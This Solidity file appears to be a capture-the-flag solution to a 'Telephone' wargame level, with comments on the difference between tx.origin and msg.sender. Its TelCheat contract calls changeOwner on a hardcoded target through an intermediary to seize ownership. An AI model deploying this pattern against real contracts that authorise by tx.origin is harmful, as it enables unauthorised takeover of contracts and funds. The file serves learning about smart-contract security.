//SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

//a simple call chain A->B->C->D, inside D msg.sender will be C, and tx.origin will be A.

// You know what functions you can call, so you define an interface to TestInterface.
interface Telephone {
    function changeOwner(address _owner) external;

    function getTx() external view returns (address);

    function getMsgsender() external view returns (address);
}

//https://ethereum.stackexchange.com/questions/1891/whats-the-difference-between-msg-sender-and-tx-origin
// tx.origin can never be a contract address.
// msg.owner can be a contract address.
// A->B->C
// My Wallet > TelCheat > Telephone
// Telephone > msg.sender(TelCheat contract address)
// Telephone > tx.orgin (My Wallet address)

contract TelCheat {
    address originalAddress = 0xa131AD247055FD2e2aA8b156A11bdEc81b9eAD95;
    Telephone public originalContract = Telephone(originalAddress);
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    function cheat() public returns (bool) {
        originalContract.changeOwner(owner);
    }

    //tx.origin inside of the Telephone is my wallet address.
    function getTx() public view returns (address) {
        return originalContract.getTx();
    }

    //msg.sender inside of the Telephone is the contract address of Telecheat.
    function getMsgsender() public view returns (address) {
        return originalContract.getMsgsender();
    }
}
